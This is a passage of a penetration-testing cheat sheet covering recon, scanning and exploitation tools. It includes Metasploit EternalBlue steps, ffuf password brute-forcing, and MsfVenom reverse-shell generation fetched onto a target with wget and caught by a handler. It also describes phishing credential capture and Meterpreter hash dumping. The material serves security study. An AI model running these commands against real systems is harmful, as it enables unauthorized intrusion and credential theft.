modules load recon/domains-contacts/whois-pocs     # load a module that was installed from the marketplace

info                              # show how to use the currently loaded module, with required params
options set SOURCE google.com     # set the SOURCE option of the module to "google.com"
run                               # find the points of contact (PoC) of the SOURCE domain and add it to the contacts table
show contacts                     # display contacts added by the module

marketplace search brute
modules load recon/domains-hosts/brute_hosts       # load the host brute-force module
info                              # show how to use the currently loaded module
run                               # try to check subdomain existence using a brute-force from a text file

marketplace search interesting
module load discovery/info_disclosure/interesting_files
info                              # show how to use the currently loaded module
run

marketplace search reporting
modules load reporting/html       # load a module to report all findings of the workspace
info
options set CREATOR Bob
options set CUSTOMER Google
run
```


### Gobuster / DirBuster / DIRB

**Gobuster** is an open-source command-line tool to enumerate web URIs, DNS sub-domains, virtual host names and AWS/GCP buckets.  
It is written in Golang, and can be installed with `sudo apt install gobuster`.  
It requires Go to be installed on the machine.

Gobuster checks the existence of each item in a wordlist by sending a request and interpreting the response.  
It is used by security professionals for penetration testing, bug bounty hunting, and cybersecurity assessments.  

Gobuster can enumerate virtual hosts, which are different from subdomains.  
Subdomains are a DNS-level concept configured as DNS entries, so Gobuster enumerates them by performing DNS lookups.  
Virtual hosts are a web-server level concept, allowing to serve different websites depending on the `Host` header of the request.  
Gobuster enumerates them by sending HTTP requests to the web server.

```shell
# show the help for a specific command
# "dir" is the command to enumerate directory and file URIs on a website
gobuster dir --help

# web directory enumeration with 64 threads
# each word from the word list is appended to the base URL
#  -t 64   : number of threads
#  -w xxx  : wordlist
#  -o xxx  : output file to store the enumeration result
#  -x php  : extension, append ".php" to all words
#  -c xxx  : configure a cookie to pass in every request (session ID for example)
#  --no-tls-validation : do not check TLS certificate (useful to accept self-signed certificates in CTF events)
gobuster dir -u "http://www.example.com/" -w list.txt -t 64

# DNS sub-domains enumeration
#  -d xxx  : domain to search for sub-domains
#  -w xxx  : wordlist
#  -c      : show CNAME records
#  -i      : show IPs
#  -r xxx  : resolver DNS server
gobuster dns -d "example.com" -w list.txt

# Vhosts enumeration
#   -u xxx : the base URL with the IP of the web server
#   --domain xxx : the domain to append to the items in the list
#   -w xxx : wordlist
#   --append-domain : specify to append the domain to the words (for example "test.example.com" for the word "test")
#   --exclude-length 250-320 : exclude responses of a given length (to exclude 404 errors)
gobuster vhost -u "http://10.10.187.130" --domain example.thm -w list.txt --append-domain --exclude-length 250-320
```

**Dirbuster** is a similar directory brute-force tool written in Java and developed by OWASP.  
It is not as fast as GoBuster but offers a GUI (started with the command `dirbuster`) and a CLI.  
It supports recursive scanning, while GoBuster cannot automatically scan discovered directories.  

**DIRB** is another similar tool written in C, more lightweight and much slower.  
It has a simple CLI, and is good for small targets.  


### WPScan

WPScan is a specialized tool to scan WordPress installations.  
It can reveal exposed directories, outdated plugins and weak usernames.

```shell
# general vulnerability scan on a WordPress site
wpscan --url www.my-worpress-site.com

# enumerate users
wpscan --url www.my-worpress-site.com --enumerate u

# enumerate plugins
wpscan --url www.my-worpress-site.com --enumerate p
```


### scanless

scanless is a utility to create an exploitation web server that can perform open port scans in a stealthier manner.  
If the target notices the scan, it appears as being performed by this web server instead of the actual host.


### The Harvester

The harvester is a Python script used by red teams during penetration tests to perform OSINT reconnaissance.  
It can gather emails, subdomains, hosts, employee names, open ports, IPs...  
It retrieves its information from around 10 public sources, like search engines, PGP key servers, the Shodan database...

```shell
# search for information about a domain using a given source
theHarvester -d example.com -b bing
```


### Spiderfoot

Spiderfoot is an automated reconnaissance tool gathering a lot of data about a target from many public data sources.  
It gives more information than TheHarvester, and can be used either in CLI or with its web UI.  
It uses more than 200 public data sources, including WHOIS, Shodan, VirusTotal...  

```shell
# start the web interface
spiderfoot -l 127.0.0.1:5001                      # web UI available at http://127.0.0.1:5001

# use the CLI
spiderfoot -s example.com -o results.html         # full scan with HTML output
spiderfoot -t example.com -m sfp_shodan           # IP info from Shodan module
spiderfoot -t example.com -m sfp_email            # email leaks
spiderfoot -t example.com -m sfp_dnsbrute         # try to bruteforce subdomains like mail.example.com
```


### Hunter.io

[Hunter.io](https://hunter.io/dashboard) is a web-based tool to find and verify professional email addresses.  
It can search for all emails for a given domain, making it useful for sales, marketing and recruitment teams.  
It can be used by penetration testers (or attackers) to identify potential targets for social engineering attacks.  

Hunter.io requires an account, and it has a free plan allowing email search by domain limited to 10 results.


### Holehe

Holehe is a Python script testing the registration of an email address against over 120 services (Amazon, GitHub...).  
The target email address is not alerted (no mail sent to the address to reset a password for example).  

It is a useful tool for **OSINT** (Open-Source INTelligence) to gather information on people.  
It can be integrated with Maltego for automatic social networks reconnaissance in GUI.


### The WayBack Machine

[The WayBack Machine](https://web.archive.org/) is an internet archive that allows to see a website as it was in the past.  
This can be used to see the content of previous versions of websites.  
It takes regular snapshots of each website, and we can select a snapshot to view it.  
This can reveal some hidden pages that are no longer accessible in the current website.  

Note that it does not archive pages that are dynamically generated.  
Also website owners can request to have their site excluded from the archive.  


### InSSIDer

InSSIDer isa GUI-based Wifi scanner to visualize and analyze wireless networks.  
It is mostly used to identify signal overlap and channel interference.


### SET (Social Engineering Toolkit)

SET is a program available by default on Kali that helps with the creation of social engineering attacks.  
SET contains many different tools, that can be selected with the CLI menu.  

For example, we can create a malicious copy of a famous website login page.  
On login, it captures the email and password, display them in the terminal, and redirect to the original website.    
_Social-Engineering Attacks > Website Attack Vectors > Credential Harvester Attack Method > Site Cloner > facebook.com_

This can be combined with a SET phishing campaign that sends a phishing email with custom sender and recipient.


### Gophish

Gophish is an open-source framework to organize phishing campaigns to assess an organization's exposure to phishing.  
It simulates real-world phishing attacks, tracks user responses and generate reports.  
It offers a GUI to create sending profiles, craft the phishing emails and monitor the results.


### Evilginx

Evilginx is a tool used for phishing attacks, to capture credentials and bypass MFA by obtaining the session token.  
It acts as a reverse-proxy between the victim and the website it tries to access.  
When the victim interacts with the phishing page created by Evilginx, it is forwarded to the real website.  
Evilginx captures the credentials and MFA token without the victim suspecting anything.  

To use Evilginx, we need to send the malicious URL to the victim by social engineering, pretending that it is the legitimate website.  
If the victim accesses it and logs in, Evilginx captures the username, password, MFA token and session token.  



## Vulnerability Scanning Tools


### Nessus

Nessus is a commercial on-premise vulnerability scanning tool widely used by large enterprises, offering a free and a paid version.  
It identifies vulnerabilities on a network, classifies them and assigns a severity to each of them.  
It also keeps track of past vulnerabilities and reports.

Nessus lets us create **scan policies**, that are definitions to describe the vulnerability tests to run.  
We can provide some credentials to a Nessus policy to perform an authenticated scan (and detect vulnerabilities when logged in).  
Nessus offers many **plugins** that are all potential vulnerabilities to check for.  

To start a scan, we must specify which scan policy to apply, and the targets of the scan.  
Once completed, the scan generates a report of all detected vulnerabilities for each target server.  
It provides details on each vulnerability, like the description, the severity, the CWE, the tools that can exploit it...


### Qualys

Qualys is a cloud subscription-based vulnerability management solution.  
It provides continuous vulnerability scanning, compliance check and asset management.  


### OpenVAS (Open Vulnerability Assessment System)

OpenVAS is a complete open-source vulnerability assessment solution developed by Greenbone offering basic vulnerability scanning features.  
It is less extensive than commercial competitors (Nessus or Qualys) but is a good solution for individuals and small businesses.  

OpenVAS can be started in a container with all its dependencies :
```shell
sudo docker run -d -p 443:443 --name openvas mikesplain/openvas
```

Once started, we can browse to `https://127.0.0.1` to access OpenVAS's login page (default: admin/admin).  
We can generate a new scan in : `Scan > Task > New Task`  
OpenVAS creates a report with all found vulnerabilities, their severity and recommended actions to address them.


### sn1per

sn1per is an automated scanner used during a penetration test to enumerate and scan vulnerabilities on the network.  
It combines in a single tools several reconnaissance and exploit tools (Nmap, Metasploit, theHarvester...).  
It is an alternative to Nessus.


### Burp Suite

The Burp suite is a Java-based web application security testing software.  
It is the industry standard tool for web application and mobile application penetration testing.  
Burp is installed by default in Kali Linux, and can be downloaded and installed on other OS from the PortSwigger website.

Burp acts as a web proxy : it captures and enables manipulation of HTTP and HTTPS traffic between a browser and a web server.  
It analyzes the traffic, sends its own requests to the web server, and reports all found security vulnerabilities.

The Burp suite comes in 3 editions : 
- **Burp Suite Community** : free for non-commercial use, include the Burp proxy, requests history and main Burp functionalities
- **Burp Suite Professional** : free trial, add an automated vulnerability scanner, a fuzzer with no rate limit, project save, access to Burp extensions...
- **Burp Suite Enterprise** : mostly used for continuous scanning, installed on a server and constantly scan the target web application for potential vulnerabilities

The main features of Burp are separated into different modules, represented as top-level tabs in the Burp GUI :
- **proxy** : enable interception and modification of requests and responses between a browser and a web application
- **repeater** : enable the capture, modification and resending of the same request several times (used for trial and error when crafting a payload)
- **intruder** : spray endpoints with requests (used for brute-force or fuzzing)
- **decoder** : decode captured info or encode payloads before sending them to the target
- **comparer** : compare 2 pieces of data (either at word or byte level)
- **sequencer** : check the randomness of tokens (like session cookies) to try to infer a pattern

The Burp suite can easily be extended with custom extensions written in Java, Python or Ruby.

The Settings button at the right of the GUI allows to configure Burp.  
Settings are split into **user settings** (persisted) and **project settings** (non-persisted).

The PortSwigger website offers extensive trainings and details about Burp.

#### Burp Proxy

The Proxy tab in the Burp dashboard allows to intercept requests sent from a browser to a website.  
Once the browser is configured to use the Burp proxy, any HTTP request sent from that browser gets intercepted by the Burp proxy.

Burp ships with a built-in Chromium browser that is already configured to use the Burp proxy.  

We can also use our own browser, but it needs to be manually configured to use the Burp proxy.  
For example, we can use the **FoxyProxy** Firefox extension and configure a proxy to `127.0.0.1:8080` (see Burp Proxy settings to know the port).  

For HTTPS to be allowed, we need the browser to trust the Burp certificate issued by PortSwigger CA.  
We can manually add the PortSwigger CA certificate in the trusted certificate :
- activate the Burp proxy
- access `http://burp/cert` to download the PortSwigger CA certificate
- access `about:preference` in Firefox URL > Privacy & Security > Certificates > View Certificates > Import

Each request reaching the proxy is captured in the Intercept tab of the proxy, where it can be viewed, modified and forwarded or dropped.  
All requests received by Burp are visible in the HTTP History tab of the proxy.  
On right-click, requests can be sent to other modules (Intruder, Repeater, Sequencer, Comparer...).

In the Intercept tab, we can toggle the requests interception, so traffic is either forwarded automatically or blocked in the proxy.  
Even when the proxy does not intercept traffic, it still keeps it in history.

#### Target

In the _Site Map_ tab, the target module builds a map of each accessed website as Burp sees the web traffic.  
It does not require the proxy to be intercepting the traffic.  

In the _Scope_ tab, we can include or exclude specific IPs or domains, to avoid capturing unnecessary traffic.  
Requests that are not in the scope will not appear in any Burp tools (Proxy, target, ...).

In the _Issue Definitions_ tab, Burp lists all the possible issues that its scanner can detect.  
The issue detection is only available in the Professional edition, but the extensive list of potential issues can be seen in the Community edition as well.

#### Repeater

The Repeater module can modify and resend intercepted requests to any target.  
We can use a request captured by the Burp proxy, edit it and send it as many times as needed.  
Requests can also be manually created from scratch, similar to what `curl` does.

The Repeater provides a user-friendly GUI to craft the requests, and offers several views of the response, including an HTML renderer.  

On the right-side of the Repeater, we can see the inspector section.  
The inspector extracts the main parts of the raw request and response to make them easier to read.  
It shows and allows edition of the request attributes, query parameters, body parameters, cookies, headers...

#### Intruder

The Intruder module offers automated request manipulation and is used for fuzzing and bruteforce attack against web applications.  
It operates on a request that is usually captured from the Proxy module and sent to Intruder.  
It can then send multiple requests to the target with configured variations between requests.  
It can be used to bruteforce a login page, or to fuzz a website looking for endpoints, subdirectories, virtual hosts...  
It offers similar functionality to the `ffuf` command-line fuzzer.

Intruder is very rate-limited in the Burp Community edition, so security professionals often use different tools.  

Intruder has several attack types :
- **sniper** : one single payload set, Intruder inserts one payload at a time, leaving all other payload positions unchanged (most common)
- **battering ram** : one single payload set, Intruder inserts the same payload in each payload position 
- **pitchfork** : one payload set per payload position (up to 20), Intruder iterates over all of them in parallel
- **cluster bomb** : one payload set per payload position (up to 20), Intruder tries every possible combination

Intruder lets us mark in the request the positions of variable parts of the query, surrounding with the `§` symbol.  
We can then define the payload that Intruder will insert at these positions.  
We define the payload type (list, number, date...) and some optional payload processing (filter, prefix, substring...).  

Burp lets us define **macros** in the Settings > Sessions menu.  
This can be used to send a request and extract from it some headers and parameters and add them to requests in the Intruder.  
For example, if a form needs to include a CSRF token, this CSRF token will change for each of our queries.  
We can use a macro to send a GET request, extract the CSRF token, and add it to the requests sent by the intruder.

#### Decoder

The Decoder module is used to encode, decode or hash data.  
Other modules can send data to its input text area.  
Operations in the Decoder module can be chained.

Its main uses are :
- encode / decode Base64
- encode / decode URL-encoded text (use of ASCII code in hex with % prefix, for example A is %41)
- generate hash (MD5 / SHA-1 / SHA-256 / ...)
- convert binary to hex
- smart decode feature to guess the encoding (like the "magic" operation in CyberChef)

#### Comparer

The Comparer module lets us compare data either at text-level or byte-level.  
Data can be pasted from the clipboard or uploaded as a file.  
It shows a comparison result and highlights modified / added / deleted parts.

#### Sequencer

The Sequencer module can determine the entropy between a number of tokens (CSRF tokens, session cookies...).  
It is used to check if tokens generated by a website are truly random or if there is a logic that can be predicted.  

It supports 2 modes :
- **manual** : the user needs to upload a list of tokens to be analyzed
- **live capture** : the user needs to supply a request, and the Sequencer sends thousands of queries to get some tokens

During a live capture, we can stop / pause the capture and display an entropy analysis.  

#### Organizer

The Organizer module lets us store and annotate some HTTP requests for later use.  
It can be used during a pentest to save requests that we want to revisit or save in a report.  
Requests in the Organizer are a read-only view of the original request, but it allows to attach notes to each request.  

#### Extensions

Burp allows developers to create and share custom Burp modules.  
The Extensions interface lists all installed modules and allows to activate or deactivate them.  
Extensions can be added by file or from the BApp store.  
The Up/Down buttons control the order the extensions are invoked when processing traffic.  
When selecting an installed extension, we can view its details, output and errors during execution. 

The **BApp store** lists all official Burp extensions with their name, rating, last update and detailed explanation.  
Java extensions integrate automatically with Burp, while Python and Ruby extensions require a Java interpreter (Jython or JRuby).  
To install Jython, download the Jython standalone JAR and reference it in Burp Extensions > Settings > Python environment.

Extension examples : 
- `Request Timer` : measure the time taken by each request, used to identify timing attacks
- `Param Miner` : identify hidden and unlinked request parameters, headers and cookies
- `JSON Web Tokens` : decode and manipulate JSON Web Tokens on the fly
- `Retire.js` : identify vulnerable JS libraries (require Burp Suite Pro)
- `Burp Bounty` : improve the active and passive scanner (require Burp Suite Pro)
- `SAML Raider` : test SAML infrastructure by intercepting, decoding and altering SAML tokens


### OWASP ZAP (Zed Attack Proxy)

OWASP ZAP is an open-source web application vulnerability scanner.  
It can be used to detect SQL injection, XSS and misconfiguration in the target web application.  
Just like Burp, ZAP acts as a proxy between the browser and the web application, allowing to intercept and manipulate traffic.  
It is mostly used via its GUI, but it also has a CLI and an API for automation.

ZAP can run in passive or active mode.  
In passive mode, it just captures the traffic without sending any intrusive payloads.  
In active mode, it sends crafted requests to test for vulnerabilities.

ZAP offers a Quick Start Automated Scan, a simple scan running against the target web application by simply entering its URL.  
It also has a Manual mode where we can navigate manually the website and ZAP finds issues in real-time.

ZAP can be integrated with a CI/CD pipeline to run scans automatically at every new version of the webapp.


### Nikto

Nikto is an open-source web server scanner written in Perl and available in Kali.  
It checks for dangerous files, outdated programs (PHP, Perl, Apache...), server misconfiguration, server-specific issues...  
It can generate an HTML summary of all the identified vulnerabilities.  
Nikto is not designed to be stealthy, it sends many requests and is easily detected by any IDS/IPS.  

```shell
# basic scan
nikto -o result.html -host 172.16.157.131

# preform a credential scan
nikto -o result.html -host 172.16.157.131 -id "admin:pa$$word" -Format htm

# use a plugin to identify exposed pages (similar to dirb or gobuster)
nikto -host 172.16.157.131 -Plugins "dictionary(dictionary:/usr/share/wordlists/dirb/common.txt)"
```


### Trivy

Trivy is an open-source security scanner developed by Aqua Security.  
It can scan container images, Kubernetes clusters, file systems, Git repositories and IaC (Terraform, Dockerfile...).  
It is lightweight and fast, offers a simple CLI and can easily be integrated with CI/CD pipelines.   

```shell
sudo apt install trivy

# pull an old image of Nginx and scan it
docker pull nginx:1.19
trivy image nginx:1.19

# scan the local file system
trivy fs <FOLDER_PATH>

# scan a GitHub repository
trivy repo <GITHUB_REPO_URL>
```

**Kube-Hunter** is another vulnerability scanner specialized for Kubernetes environments.  
It is no longer under active development, so it is missing the latest CVEs, Trivy should be preferred.  


### Grype

Grype is a powerful vulnerability scanner designed for container images, file systems and SBOMs (Software Bill of Materials).  
A SBOM is a detailed list of all components and dependencies in a software application.  

Grype can detect vulnerabilities in the OS packages of a container image.  
It can also identify vulnerabilities inside an SBOM file.  

```shell
# scan a container image for vulnerabilities
sudo grype docker:vulnerable-image

# scan a file system for vulnerable software
sudo grype dir:<FOLDER>

# scan a SBOM file for vulnerabilities
sudo grype sbom:sbom.cdx.json
```


### BloodHound

**BloodHound** is a tool designed to visualize Active Directory environments and identify potential vulnerabilities.  
It uses graph theory to study the connections between users, computers and groups.  

**SharpHound** is the BloodHound component that gathers information from AD about user permissions, group memberships, active sessions...  
Once the data is collected, it is  imported into BloodHound for analysis.  

BloodHound identifies all the paths an attacker could take to escalate privileges.  
It makes it easy to query the AD data and identify high-risk configurations.  


### TruffleHog

TruffleHog is a tool designed to find sensitive data (like passwords, API keys, secrets...) in source code repositories.  
It can search in the history of the repositories and find secrets that have been removed since.  

TruffleHog works on many source code repositories : Git, GitHub, GitLab, S3 buckets, Docker images, ...

```shell
# scan a local Git repository
trufflehog git <PATH_TO_GIT_REPO>

# scan a remote Git repository
trufflehog git https://github.com/<REPO_URL>
```


### ffuf - Fuzz Faster U Fool

fuff is a fast web fuzzer written in Go.  
It accepts a list of words, and sends many requests to a web server replacing a placeholder by the words in the list.  
It can detect which requests were successful and which were not and report its findings.  
This is used for discovery of hidden files or pages in a website.

Some good word lists are publicly available :
- [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
- [https://github.com/six2dez/OneListForAll](https://github.com/six2dez/OneListForAll) 

```shell
# simple example with a FUZZ placeholder in the URL
ffuf -w wordlist.txt -u 'https://ffuf.io.fi/FUZZ'

# same but with a custom placeholder name
ffuf -w wordlist.txt:FOO -u 'https://ffuf.io.fi/FOO'

# multiple word lists
# by default it tries every combination of words (n*m combinations)
# use "-mode pitchwork" to use the 1st word of each list, then the 2nd of each list... (n combinations)
ffuf -w wordlist1.txt:FOO -w wordlist2.txt:BAR -u 'https://ffuf.io.fi/FOO/BAR'

# list all valid usernames in a website among a list of usernames
# we use the POST method (GET by default)
# we provide the POST body with -d parameter, as url-encoded, so we add the corresponding header
# -mr lets us match the positive results on a regex (by default it matches on non-error response codes)
ffuf -w SecLists/Usernames/Names/names.txt
     -X POST
     -d "username=FUZZ&email=x&password=x&cpassword=x" 
     -H "Content-Type: application/x-www-form-urlencoded"
     -u http://10.10.1.80/customers/signup
     -mr "user already exists"

# brute-force password by using a list of valid usernames and a list of potential passwords
# use -fc 200 to filter out the 200 status code (considered as failed)
ffuf -w valid_usernames.txt:W1
     -w SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2
     -X POST
     -d "username=W1&password=W2" 
     -H "Content-Type: application/x-www-form-urlencoded"
     -u http://10.10.1.80/customers/login
     -fc 200
```



## Exploiting Tools


### searchsploit

searchsploit is a command-line tool in Kali Linux to search exploits from the exploit database.  
Exploit scripts are all saved locally under `/usr/share/exploitdb/exploits/`.  

```shell
searchsploit "online book store"                            # search for exploits on the Online Book Store application
cat /usr/share/exploitdb/exploits/php/webapps/47887.py      # show the code of an exploit found
```


### Metasploit

Metasploit (or MSF for Metasploit Framework) is a command-line security tool improving penetration testing.  
It is a set of tools for information gathering, exploitation, exploit development, post-exploitation...

If a vulnerability was discovered (with Nessus or sn1per for example), we can check if Metasploit has an exploit for it.  
If it does, we can execute the exploit, and Metasploit can provide a command shell on this victim machine.  

It is a script-kiddie friendly framework to attack machines without understanding the actual vulnerabilities.  
It also offers more advanced capabilities, like the creation of custom plugins to exploit new vulnerabilities.

The `msfconsole` command starts the Metasploit console, through which we can interact with all Metasploit modules.  
Modules are components of the Metasploit framework built to perform a specific task (vulnerability exploit, target scan, brute-force attack...).   

Modules are the core of Metasploit and are organized in a hierarchy :
- **auxiliary** : all supporting modules, like scanners, crawlers, fuzzers...
- **encoders** : encode the exploit and payload to obfuscate their content, making them harder to detect
- **evasion** : implement advanced techniques to avoid detection by antivirus
- **exploits** : module exploiting known vulnerabilities, classified by system
- **NOPS** : No-Operation, modules doing nothing used for padding to achieve consistent payload sizes
- **payloads** : code that run on the target system once the exploit has been executed
- **post** : post-exploit operation, for reconnaissance, lateral movement, privilege escalation, cleanup...

Many Shell commands can also be run in the Metasploit console : `ls`, `cd`, `top`, `ping`, `nmap`, `clear`, `history` ...

We use the `use <MODULE>` command to load a module, which creates a local context to define variables.  
Each module defines a set of variables that can be optional or mandatory, and can have or not a default value.  
These variables can be displayed with the `show options` command when the module is loaded.  
Some common variables used by various modules are :
- `RHOSTS` (remote hosts) : target IP, IP range, network address (CIDR notation) or file containing targets
- `RPORT` (remote port) : port on the target system
- `PAYLOAD` : payload to use in the exploit
- `LHOST` (local host) : the attacking machine address
- `LPORT` (local port) : the port on the attacking machine
- `SESSION` : session ID created by Metasploit after a successful connection to a target system, used by post-exploitation modules

Modules usually come with a default payload, the action that is performed once the exploit gave access to the target.  
The default payload is usually `reverse_tcp` that opens a shell (Meterpreter, bash or cmd) on the target machine.  
We can see other available payloads, including different types of reverse shells, with `show payloads`, and set one with `set payload PAYLOAD_ID` 

The prompt allows us to distinguish among the possible shells in Metasploit :
- normal shell out of Metasploit
- top-level Metasploit shell
- shell with the context of a loaded module
- Meterpreter shell : Metasploit payload offering a shell on the target system
- target system shell : we may have a common cmd or bash shell on the target system

```shell
# list all types of objects we can list with the show command
help show

# show global options, or module-level options if a module is loaded
show options

# list all exploit modules in Metasploit
show exploits

# search available modules for a keyword, target system or CVE number
search eternalblue  

# display the documentation about module 0 returned in the previous search
info 0

# Load a module for use (EternalBlue exploit targeting SMBv1, leaked in Apr17 and used in WannaCry in May17)
use exploit/windows/smb/ms17_010_eternalblue 

# show payload modules that can be used with the loaded exploit
show payloads

# set a payload to use instead of the default one (using the ID in the "show payloads" output)
set payload 2

# set or unset a variable listed in "show options" for the loaded module
set RHOSTS 10.10.166.19
unset RHOSTS

# set or unset a global variable that will be used for all modules
setg RHOSTS 10.10.166.19
unsetg RHOSTS

# run the exploit (-z to background the session when opened)
exploit
run             #  alias for "exploit"

# move the currently open session to the background and move back to the msfconsole prompt (Ctrl-Z does the same)
background

# exit the context and go back to the top-level Metasploit console
back

# list the existing sessions
sessions

# re-attach a session in the background, using its ID listed with "sessions"
sessions -i 1
```

#### Exploit Example

To check if a target machine is vulnerable to EternalBlue and exploit it to get a Meterpreter shell :
```shell
msfconsole                                     # enter the Metasploit console
setg RHOSTS <TARGET_IP>                        # set the target IP as a global variable
search eternalblue                             # look for modules about EternalBlue
use auxiliary/scanner/smb/smb_ms17_010         # load the scanner (same as "use 3" referencing the search result)
exploit                                        # run the scanner and confirm that the target is vulnerable to EternalBlue
use exploit/windows/smb/ms17_010_eternalblue   # load the EternalBlue exploit module
exploit                                        # run the exploit and obtain a Meterpreter shell on the target
background                                     # put the Meterpreter shell in the background
sessions                                       # see the Meterpreter shell in the background (usable for post-exploit)     
```

#### Useful modules

- `auxiliary/scanner/portscan/tcp` : scan for open TCP ports (similar to Nmap)
- `auxiliary/scanner/smtp/smtp_relay` : detect if an SMTP server allows open relay
- `scanner/discovery/udp_sweep` : scan for open UDP ports
- `scanner/smb/smb_enumshares` : enumerate the shares provided by the SMB service
- `scanner/smb/smb_enumusers` : enumerate the SMB users
- `scanner/smb/smb_login` : crack an SMB user password from a wordlist (we can then use `smbclient` to access a SMB share)
- `exploit/multi/fileformat/office_word_macro` : create a MS Word document containing a macro executing a payload when opened
- `exploit/windows/local/tokenmagic` : UAC bypass to elevate privileges of an existing session to SYSTEM
- `exploit/windows/smb/ms17_010_eternalblue` : open a Meterpreter shell on a machine vulnerable to EternalBlue
- `exploit/windows/smb/psexec` : open a Meterpreter (or any other payload) from a machine using SMB username/password
- `post/linux/gather/hashdump` : post-exploit module to list user password hashes on a Linux target
- `post/multi/manage/shell_to_meterpreter` : convert a shell to a Meterpreter shell
- `post/multi/recon/local_exploit_suggester` : analyze the target system to suggest potential exploits
- `post/windows/gather/enum_shares` : enumerate SMB shares
- `post/windows/manage/enable_rdp` : enable RDP so we can remote desktop to the target machine as a compromised user

#### Metasploit Database

Metasploit can use a database to keep track of the multiple on-going projects.  
It uses PostgreSQL, and can be started and initialized with :
```shell
systemctl start postgresql
msfdb init
```

After the database is created, we can interact with it from inside the Metasploit console.  
The DB status can be checked with the `db_status` command, and all database-related commands are shown with `help`.  
For example `db_nmap` is a `nmap` variant that saves its results in the DB, viewable with the `hosts` and `services` commands.

We can create workspaces to isolate different projects (by default, we are in the `default` workspace).
```
workspace                     # list workspaces and show active one
workspace -a workspaceA       # create a new workspace and set it as active
workspace workspaceA          # set a workspace as active
workspace -d workspaceA       # delete a workspace
```

#### Meterpreter

Meterpreter is a Metasploit payload that creates a specialized shell supporting penetration testing.  
It runs on the target system, often on a reverse shell controlled from within the Metasploit console.

Meterpreter runs in RAM memory as a process and does not write any file on disk in the target system, in order to avoid detection.  
Its communication with the local machine is encrypted with TLS, so IDS will only detect it if they decrypt traffic.  
However, Meterpreter can still be recognized by most major antivirus software.  

We can list the different flavors of Meterpreter in MsfVenom with the `msfvenom -l payloads | grep meterpreter` command.  
We can see that it has different versions depending on the OS of the target machine (Android, iOS, Linux, OSX, Windows).  
It also has versions that depend on a technology being available on the target machine (Java, PHP, Python).  

Meterpreter payloads exist in **inline** (also called **single** or **stageless**) or **staged** form.  
An inline payload contains the entire payload in its binary.  
A staged payload is smaller and contains only a stager, that downloads the actual payload from the attacker machine and runs it in memory.  
Inline payloads use the `_` symbol, for example `python/meterpreter_reverse_tcp` is inline and `python/meterpreter/reverse_tcp` is its staged equivalent.  

Exploits in Metasploit only support a subset of payloads, that can be listed with `show payloads` when the exploit module is loaded.

Meterpreter exposes its own set of specialized commands to interact with the target machine.  
These can vary from a version of Meterpreter to the other, so check available commands listed in the `help` command. 

```shell
help                             # show available Meterpreter commands

# basic shell commands
ls
cd <FOLDER>
pwd
cat "<FILE_PATH>"                     # display the content of a file
ps                                    # list running processes
edit <FILE_PATH>                      # edit a file
rm <FILE_PATH>                        # delete a file
upload <LOCAL_PATH> <REMOTE_PATH>     # transfer a file from the attacker's machine to the target machine
download <REMOTE_PATH> <LOCAL_PATH>   # transfer a file from the target machine to the attacker's machine

# Meterpreter specialized commands
getpid                           # get the process ID of the Meterpreter process
getuid                           # get the user that Meterpreter runs as
guid                             # get session GUID
sysinfo                          # show info about the target machine (including OS)
getprivs                         # enable and list all privileges available to the current user
search *.txt                     # look for specific files on the target host
hashdump                         # dump the content of the SAM database (user password's hashes)
getsystem                        # try to elevate privilege to system
migrate <PID>                    # migrate Meterpreter to another process on the target machine
load <METERPRETER_EXTENSION>     # load an extension : python, kiwi (updated version of mimikatz) to add new commands in Meterpreter
  
# networking
arp                              # display the target machine's ARP cache
ifconfig                         # network interfaces on the target machine
netstat                          # network connections on the target machine
route                            # view and modify the route table on the target machine

# post-exploit modules
info <POST_MODULE>               # show info about a post-exploit module
run  <POST_MODULE>               # run the post-exploit module 

shell                            # start a regular shell on the target machine (ctrl-Z to go back to Meterpreter)
background                       # send this Meterpreter shell to the background (use "sessions" to see it)
exit                             # close this Meterpreter shell
```

It can contain many other commands, like commands to control the webcam, capture keystrokes, take a screenshot, shutdown/reboot the target machine...

Migrating Meterpreter to an existing process helps Meterpreter interact with it.  
For example, we can migrate to the PID of a word-processing process (Word, Notepad...), and then capture its key strokes.  
Note that when migrating to a process, we get the privileges of the user who started the process, and we may not be able to get back to the original privileges.  
On Windows machine, the printer service `spoolsv.exe` is a good candidate to migrate to, because it runs as SYSTEM user and restarts on crash.

Meterpreter extensions can be loaded to enrich the capabilities of the Meterpreter shell with additional commands.  
For example, the `kiwi` extension (recent version of Mimikatz) adds commands to obtain various passwords and password hashes from the target machine.  
It can also create a golden Kerberos ticket to get access with any user to any component of the system.


#### MsfVenom

MsfVenom is a tool to create custom payloads, replacing deprecated tools MsfPayload and MsfEncode since 2015.  
It has access to all payloads in Metasploit and can craft payloads in several formats (PHP, exe, py, dll, elf, jar ...) 
for different target systems (windows, linux, apple, android...).

```shell
msfvenom                                  # display the help
msfvenom -l payloads                      # list all payload modules (can also list encoders, nops, formats...)
msfvenom -p php/meterpreter/reverse_tcp   # create a payload based on reverse_tcp
         LHOST=10.10.186.44               # set the local host to connect to 
         -f raw                           # set the format of the payload to create
         -e php/base64                    # set the encoder to use
```

Reverse shells or Meterpreter callbacks in the MsfVenom payloads can be caught on the attacker machine with a **handler**.  
This is done automatically by Metasploit when running an exploit with a payload, but needs to be manually done when running 
a custom payload crafted with MsfVenom.  
To start this handler, we can run the `exploit/multi/handler` module in Metasploit (it needs to use the same local host as in MsfVenom).

For example, we can craft a Meterpreter reverse shell binary for a x86 Linux system with : 
```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f elf > reverse_shell.elf
```

We can then transfer this binary to the target system.  
If we have a shell on the system, we can use a python HTTP server locally and `wget` on the target system :
```shell
# on the local machine that ran msfvenom : temporarily create a HTTP web server to expose the reverse shell binary  
python3 -m http.server 9000

# on the target machine : download the reverse shell binary
wget http://<LOCAL_IP>:9000/reverse_shell.elf
```

Before we run the reverse shell on the target machine, we need a handler that can catch it on the local machine.  
We can use the `exploit/multi/handler` module, but we need to set its payload to the same one as the venom reverse shell (otherwise, segmentation fault).  
```shell
# in Metasploit console
use exploit/multi/handler
set LHOST <LOCAL_IP>
set payload linux/x86/meterpreter/reverse_tcp
exploit
```

Now Metasploit is waiting for the reverse shell of the target machine to connect to it.  
We can start the reverse shell on the target machine (the port is 4444 by default both in the reverse shell and in the handler).  
```shell
chmod 777 reverse_shell.elf
./reverse_shell.elf
```

This now gives access to a Meterpreter shell in the handler of the Metasploit console.  
It can be either used directly, or put in the background and used to run some post-exploit modules :
